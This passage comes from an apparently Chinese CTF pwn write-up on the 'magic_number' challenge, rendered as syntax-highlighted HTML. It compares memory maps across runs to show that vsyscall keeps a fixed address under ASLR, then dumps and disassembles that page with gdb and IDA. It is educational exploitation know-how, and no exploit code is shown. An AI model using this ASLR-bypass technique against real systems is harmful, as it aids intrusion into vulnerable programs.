operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so7f2c89967000<span class="token operator">-</span>7f2c89b67000 <span class="token operator">--</span><span class="token operator">-</span>p <span class="token number">001e7000</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">1052455</span>                    <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so7f2c89b67000<span class="token operator">-</span>7f2c89b6b000 r<span class="token operator">--</span>p <span class="token number">001e7000</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">1052455</span>                    <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so7f2c89b6b000<span class="token operator">-</span>7f2c89b6d000 rw<span class="token operator">-</span>p 001eb000 <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">1052455</span>                    <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so7f2c89b6d000<span class="token operator">-</span>7f2c89b71000 rw<span class="token operator">-</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span> 7f2c89b71000<span class="token operator">-</span>7f2c89b98000 r<span class="token operator">-</span>xp <span class="token number">00000000</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">1052451</span>                    <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so7f2c89d5b000<span class="token operator">-</span>7f2c89d7f000 rw<span class="token operator">-</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span> 7f2c89d98000<span class="token operator">-</span>7f2c89d99000 r<span class="token operator">--</span>p <span class="token number">00027000</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">1052451</span>                    <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so7f2c89d99000<span class="token operator">-</span>7f2c89d9a000 rw<span class="token operator">-</span>p <span class="token number">00028000</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">1052451</span>                    <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so7f2c89d9a000<span class="token operator">-</span>7f2c89d9b000 rw<span class="token operator">-</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span> 7ffd6e568000<span class="token operator">-</span>7ffd6e589000 rw<span class="token operator">-</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span>                          <span class="token punctuation">[</span>stack<span class="token punctuation">]</span>7ffd6e5bc000<span class="token operator">-</span>7ffd6e5bf000 r<span class="token operator">--</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span>                          <span class="token punctuation">[</span>vvar<span class="token punctuation">]</span>7ffd6e5bf000<span class="token operator">-</span>7ffd6e5c1000 r<span class="token operator">-</span>xp <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span>                          <span class="token punctuation">[</span>vdso<span class="token punctuation">]</span>ffffffffff600000<span class="token operator">-</span>ffffffffff601000 r<span class="token operator">-</span>xp <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span>                  <span class="token punctuation">[</span>vsyscall<span class="token punctuation">]</span></code></pre><p>再次执行：</p><pre class=" language-java"><code class="language-java">01fd7000<span class="token operator">-</span>01ff8000 rw<span class="token operator">-</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span>                                  <span class="token punctuation">[</span>heap<span class="token punctuation">]</span>7f074db97000<span class="token operator">-</span>7f074e02a000 r<span class="token operator">--</span>p <span class="token number">00000000</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">132431</span>                     <span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>locale<span class="token operator">/</span>locale<span class="token operator">-</span>archive7f074e02a000<span class="token operator">-</span>7f074e211000 r<span class="token operator">-</span>xp <span class="token number">00000000</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">1052455</span>                    <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so7f074e211000<span class="token operator">-</span>7f074e411000 <span class="token operator">--</span><span class="token operator">-</span>p <span class="token number">001e7000</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">1052455</span>                    <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so7f074e411000<span class="token operator">-</span>7f074e415000 r<span class="token operator">--</span>p <span class="token number">001e7000</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">1052455</span>                    <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so7f074e415000<span class="token operator">-</span>7f074e417000 rw<span class="token operator">-</span>p 001eb000 <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">1052455</span>                    <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so7f074e417000<span class="token operator">-</span>7f074e41b000 rw<span class="token operator">-</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span> 7f074e41b000<span class="token operator">-</span>7f074e442000 r<span class="token operator">-</span>xp <span class="token number">00000000</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">1052451</span>                    <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so7f074e605000<span class="token operator">-</span>7f074e629000 rw<span class="token operator">-</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span> 7f074e642000<span class="token operator">-</span>7f074e643000 r<span class="token operator">--</span>p <span class="token number">00027000</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">1052451</span>                    <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so7f074e643000<span class="token operator">-</span>7f074e644000 rw<span class="token operator">-</span>p <span class="token number">00028000</span> <span class="token number">08</span><span class="token operator">:</span><span class="token number">01</span> <span class="token number">1052451</span>                    <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.27</span><span class="token punctuation">.</span>so7f074e644000<span class="token operator">-</span>7f074e645000 rw<span class="token operator">-</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span> 7fffa112f000<span class="token operator">-</span>7fffa1150000 rw<span class="token operator">-</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span>                          <span class="token punctuation">[</span>stack<span class="token punctuation">]</span>7fffa11b7000<span class="token operator">-</span>7fffa11ba000 r<span class="token operator">--</span>p <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span>                          <span class="token punctuation">[</span>vvar<span class="token punctuation">]</span>7fffa11ba000<span class="token operator">-</span>7fffa11bc000 r<span class="token operator">-</span>xp <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span>                          <span class="token punctuation">[</span>vdso<span class="token punctuation">]</span>ffffffffff600000<span class="token operator">-</span>ffffffffff601000 r<span class="token operator">-</span>xp <span class="token number">00000000</span> <span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span> <span class="token number">0</span>                  <span class="token punctuation">[</span>vsyscall<span class="token punctuation">]</span></code></pre><p>可以发现堆区，栈区，以及一些libc库的基地址都发生了变化，只有那个神奇的东西其地址不动如山。他就是———–vsyscall<br>vsyscall的地址一直在ffffffffff600000-ffffffffff601000之间</p><h2 id="vsyscall何许人也"><a href="#vsyscall何许人也" class="headerlink" title="vsyscall何许人也~"></a>vsyscall何许人也~</h2><blockquote><p>简单地说，现代的Windows/*Unix操作系统都采用了分级保护的方式，内核代码位于R0，用户代码位于R3。许多对硬件和内核等的操作都会被包装成内核函数并提供一个接口给用户层代码调用，这个接口就是我们熟知的int 0x80/syscall+调用号模式。当我们每次调用这个接口时，为了保证数据的隔离，我们需要把当前的上下文(寄存器状态等)保存好，然后切换到内核态运行内核函数，然后将内核函数返回的结果放置到对应的寄存器和内存中，再恢复上下文，切换到用户模式。这一过程需要耗费一定的性能。对于某些系统调用，如gettimeofday来说，由于他们经常被调用，如果每次被调用都要这么来回折腾一遍，开销就会变成一个累赘。因此系统把几个常用的无参内核调用从内核中映射到用户空间中，这就是vsyscall.</p></blockquote><h3 id="gdb-dump-文件"><a href="#gdb-dump-文件" class="headerlink" title="gdb dump 文件"></a>gdb dump 文件</h3><ul><li><p>先在一个终端运行某个程序</p><pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>DASCTF<span class="token operator">/</span>七夕$ <span class="token punctuation">.</span>/magic_number Your Input <span class="token operator">:</span></code></pre></li><li><p>开启一个终端查看进程PID</p><pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span>$ ps aux <span class="token operator">|</span> grep magic_numberhunter    <span class="token number">11588</span>  <span class="token number">0.3</span>  <span class="token number">1.4</span> <span class="token number">774976</span> <span class="token number">28600</span> <span class="token operator">?</span>        Sl   <span class="token number">23</span><span class="token operator">:</span><span class="token number">00</span>   <span class="token number">0</span><span class="token operator">:</span><span class="token number">09</span> gedit <span class="token operator">/</span>home<span class="token operator">/</span>hunter<span class="token operator">/</span>PWN<span class="token operator">/</span>DASCTF<span class="token operator">/</span>七夕<span class="token operator">/</span>magic_number<span class="token punctuation">.</span>pyhunter    <span class="token number">13464</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>   <span class="token number">4376</span>   <span class="token number">708</span> pts<span class="token operator">/</span><span class="token number">3</span>    S<span class="token operator">+</span>   <span class="token number">23</span><span class="token operator">:</span><span class="token number">50</span>   <span class="token number">0</span><span class="token operator">:</span><span class="token number">00</span> <span class="token punctuation">.</span>/magic_number   hunter    <span class="token number">13495</span>  <span class="token number">0.0</span>  <span class="token number">0.0</span>  <span class="token number">16180</span>  <span class="token number">1092</span> pts<span class="token operator">/</span><span class="token number">18</span>   S<span class="token operator">+</span>   <span class="token number">23</span><span class="token operator">:</span><span class="token number">51</span>   <span class="token number">0</span><span class="token operator">:</span><span class="token number">00</span> grep <span class="token operator">--</span>color<span class="token operator">=</span>auto magic_number是中间那个</code></pre></li><li><p>执行 sudo gdb attach 13464  </p><pre class=" language-java"><code class="language-java">R12<span class="token operator">:</span> <span class="token function">0x555fc4460870</span> <span class="token punctuation">(</span>xor    ebp<span class="token punctuation">,</span>ebp<span class="token punctuation">)</span>R13<span class="token operator">:</span> <span class="token number">0x7ffe99e87760</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1</span> R14<span class="token operator">:</span> <span class="token number">0x0</span> R15<span class="token operator">:</span> <span class="token number">0x0</span>EFLAGS<span class="token operator">:</span> <span class="token function">0x246</span> <span class="token punctuation">(</span>carry PARITY adjust ZERO sign trap INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>code<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span> <span class="token number">0x7fa10243707b</span> <span class="token operator">&lt;</span>__GI___libc_read<span class="token operator">+</span><span class="token number">11</span><span class="token operator">></span><span class="token operator">:</span>    jne    <span class="token number">0x7fa102437090</span> <span class="token operator">&lt;</span>__GI___libc_read<span class="token operator">+</span><span class="token number">32</span><span class="token operator">></span> <span class="token number">0x7fa10243707d</span> <span class="token operator">&lt;</span>__GI___libc_read<span class="token operator">+</span><span class="token number">13</span><span class="token operator">></span><span class="token operator">:</span>    xor    eax<span class="token punctuation">,</span>eax <span class="token number">0x7fa10243707f</span> <span class="token operator">&lt;</span>__GI___libc_read<span class="token operator">+</span><span class="token number">15</span><span class="token operator">></span><span class="token operator">:</span>    syscall <span class="token operator">=</span><span class="token operator">></span> <span class="token number">0x7fa102437081</span> <span class="token operator">&lt;</span>__GI___libc_read<span class="token operator">+</span><span class="token number">17</span><span class="token operator">></span><span class="token operator">:</span>    cmp    rax<span class="token punctuation">,</span><span class="token number">0xfffffffffffff000</span> <span class="token number">0x7fa102437087</span> <span class="token operator">&lt;</span>__GI___libc_read<span class="token operator">+</span><span class="token number">23</span><span class="token operator">></span><span class="token operator">:</span>    ja     <span class="token number">0x7fa1024370e0</span> <span class="token operator">&lt;</span>__GI___libc_read<span class="token operator">+</span><span class="token number">112</span><span class="token operator">></span> <span class="token number">0x7fa102437089</span> <span class="token operator">&lt;</span>__GI___libc_read<span class="token operator">+</span><span class="token number">25</span><span class="token operator">></span><span class="token operator">:</span>    repz ret  <span class="token number">0x7fa10243708b</span> <span class="token operator">&lt;</span>__GI___libc_read<span class="token operator">+</span><span class="token number">27</span><span class="token operator">></span><span class="token operator">:</span>    nop    DWORD PTR <span class="token punctuation">[</span>rax<span class="token operator">+</span>rax<span class="token operator">*</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">0x0</span><span class="token punctuation">]</span> <span class="token number">0x7fa102437090</span> <span class="token operator">&lt;</span>__GI___libc_read<span class="token operator">+</span><span class="token number">32</span><span class="token operator">></span><span class="token operator">:</span>    push   r12<span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>stack<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span><span class="token number">0000</span><span class="token operator">|</span> <span class="token number">0x7ffe99e87648</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x555fc4460ae0</span> <span class="token punctuation">(</span>mov    eax<span class="token punctuation">,</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token number">0008</span><span class="token operator">|</span> <span class="token number">0x7ffe99e87650</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x7fa1027289a0</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>_dl_fini<span class="token operator">></span><span class="token operator">:</span>    push   rbp<span class="token punctuation">)</span><span class="token number">0016</span><span class="token operator">|</span> <span class="token number">0x7ffe99e87658</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0024</span><span class="token operator">|</span> <span class="token number">0x7ffe99e87660</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x555fc4460af0</span> <span class="token punctuation">(</span>push   r15<span class="token punctuation">)</span><span class="token number">0032</span><span class="token operator">|</span> <span class="token number">0x7ffe99e87668</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x555fc4460870</span> <span class="token punctuation">(</span>xor    ebp<span class="token punctuation">,</span>ebp<span class="token punctuation">)</span><span class="token number">0040</span><span class="token operator">|</span> <span class="token number">0x7ffe99e87670</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x7ffe99e87760</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1</span> <span class="token number">0048</span><span class="token operator">|</span> <span class="token number">0x7ffe99e87678</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xb483671a00000000</span> <span class="token number">0056</span><span class="token operator">|</span> <span class="token number">0x7ffe99e87680</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x555fc4460af0</span> <span class="token punctuation">(</span>push   r15<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token punctuation">]</span>Legend<span class="token operator">:</span> code<span class="token punctuation">,</span> data<span class="token punctuation">,</span> rodata<span class="token punctuation">,</span> value<span class="token number">0x00007fa102437081</span> in <span class="token function">__GI___libc_read</span> <span class="token punctuation">(</span>fd<span class="token operator">=</span><span class="token number">0x0</span><span class="token punctuation">,</span> buf<span class="token operator">=</span><span class="token number">0x7ffe99e87650</span><span class="token punctuation">,</span> nbytes<span class="token operator">=</span><span class="token number">0x100</span><span class="token punctuation">)</span> at <span class="token punctuation">.</span><span class="token punctuation">.</span>/sysdeps<span class="token operator">/</span>unix<span class="token operator">/</span>sysv<span class="token operator">/</span>linux<span class="token operator">/</span>read<span class="token punctuation">.</span>c<span class="token operator">:</span><span class="token number">27</span><span class="token number">27</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span>/sysdeps<span class="token operator">/</span>unix<span class="token operator">/</span>sysv<span class="token operator">/</span>linux<span class="token operator">/</span>read<span class="token punctuation">.</span>c<span class="token operator">:</span> 没有那个文件或目录<span class="token punctuation">.</span>gdb<span class="token operator">-</span>peda$ </code></pre></li><li><p>dump 地址 ：dump memory 生成的文件名 addr1 addr2  </p><pre class=" language-java"><code class="language-java"><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token punctuation">]</span>Legend<span class="token operator">:</span> code<span class="token punctuation">,</span> data<span class="token punctuation">,</span> rodata<span class="token punctuation">,</span> value<span class="token number">0x00007feca1425081</span> in <span class="token function">__GI___libc_read</span> <span class="token punctuation">(</span>fd<span class="token operator">=</span><span class="token number">0x0</span><span class="token punctuation">,</span> buf<span class="token operator">=</span><span class="token number">0x7ffc39ab82e0</span><span class="token punctuation">,</span> nbytes<span class="token operator">=</span><span class="token number">0x100</span><span class="token punctuation">)</span> at <span class="token punctuation">.</span><span class="token punctuation">.</span>/sysdeps<span class="token operator">/</span>unix<span class="token operator">/</span>sysv<span class="token operator">/</span>linux<span class="token operator">/</span>read<span class="token punctuation">.</span>c<span class="token operator">:</span><span class="token number">27</span><span class="token number">27</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span>/sysdeps<span class="token operator">/</span>unix<span class="token operator">/</span>sysv<span class="token operator">/</span>linux<span class="token operator">/</span>read<span class="token punctuation">.</span>c<span class="token operator">:</span> 没有那个文件或目录<span class="token punctuation">.</span>gdb<span class="token operator">-</span>peda$ dump memory magic_number<span class="token punctuation">.</span>dump <span class="token number">0xffffffffff600000</span> <span class="token number">0xffffffffff601000</span>gdb<span class="token operator">-</span>peda$ 这样就把从<span class="token number">0xffffffffff600000</span>到<span class="token number">0xffffffffff601000</span>地址处的二进制文件dump下来，生成magic_number<span class="token punctuation">.</span>dump文件</code></pre></li></ul><h3 id="IDA查看"><a href="#IDA查看" class="headerlink" title="IDA查看"></a>IDA查看</h3><pre class=" language-java"><code class="language-java">seg000<span class="token operator">:</span><span class="token number">0000000000000000</span> <span class="token punctuation">;</span> Format      <span class="token operator">:</span> 二进制seg000<span class="token operator">:</span><span class="token number">0000000000000000</span> <span class="token punctuation">;</span> Base Address<span class="token operator">:</span> 0000h Range<span class="token operator">:</span> 0000h <span class="token operator">-</span> 1000h Loaded length<span class="token operator">:</span> 1000hseg000<span class="token operator">:</span><span class="token number">0000000000000000</span>seg000<span class="token operator">:</span><span class="token number">0000000000000000</span>                 <span class="token punctuation">.</span>686pseg000<span class="token operator">:</span><span class="token number">0000000000000000</span>                 <span class="token punctuation">.</span>mmxseg000<span class="token operator">:</span><span class="token number">0000000000000000</span>                 <span class="token punctuation">.</span>model flatseg000<span class="token operator">:</span><span class="token number">0000000000000000</span>seg000<span class="token operator">:</span><span class="token number">0000000000000000</span> <span class="token punctuation">;</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>seg000<span class="token operator">:</span><span class="token number">0000000000000000</span>seg000<span class="token operator">:</span><span class="token number">0000000000000000</span> <span class="token punctuation">;</span> Segment type<span class="token operator">:</span> Pure codeseg000<span class="token operator">:</span><span class="token number">0000000000000000</span> seg000          segment <span class="token keyword">byte</span> <span class="token keyword">public</span> <span class="token string">'CODE'</span> use64seg000<span class="token operator">:</span><span class="token number">0000000000000000</span>                 assume cs<span class="token operator">:</span>seg000seg000<span class="token operator">:</span><span class="token number">0000000000000000</span>                 assume es<span class="token operator">:</span>nothing<span class="token punctuation">,</span> ss<span class="token operator">:</span>nothing<span class="token punctuation">,</span> ds<span class="token operator">:</span>nothing<span class="token punctuation">,</span> fs<span class="token operator">:</span>nothing<span class="token punctuation">,</span> gs<span class="token operator">:</span>nothingseg000<span class="token operator">:</span><span class="token number">0000000000000000</span>                 mov     rax<span class="token punctuation">,</span> 60hseg000<span class="token operator">:</span><span class="token number">0000000000000007</span>                 syscall                 <span class="token punctuation">;</span> Low latency system callseg000<span class="token operator">:</span><span class="token number">0000000000000009</span>                 retnseg000<span class="token operator">:</span><span class="token number">0000000000000009</span> <span class="token punctuation">;</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>seg000<span class="token operator">:</span>000000000000000A                 align 400hseg000<span class="token operator">:</span><span class="token number">0000000000000400</span>                 mov     rax<span class="token punctuation">,</span> 0C9hseg000<span class="token operator">:</span><span class="token number">0000000000000407</span>                 syscall                 <span class="token punctuation">;</span> Low latency system callseg000<span class="token operator">:</span><span class="token number">0000000000000409</span>                 retnseg000<span class="token operator">:</span><span class="token number">0000000000000409</span> <span class="token punctuation">;</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>seg000<span class="token operator">:</span>000000000000040A                 align 400hseg000<span class="token operator">:</span><span class="token number">0000000000000800</span>                 mov     rax<span class="token punctuation">,</span> 135hseg000<span class="token operator">:</span><span class="token number">0000000000000807</span>                 syscall                 <span class="token punctuation">;</span> Low latency system callseg000<span class="token operator">:</span><span class="token number">0000000000000809</span>                 retnseg000<span class="token operator">:</span><span class="token number">0000000000000809</span> <span class="token punctuation">;</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>seg000<span class="token 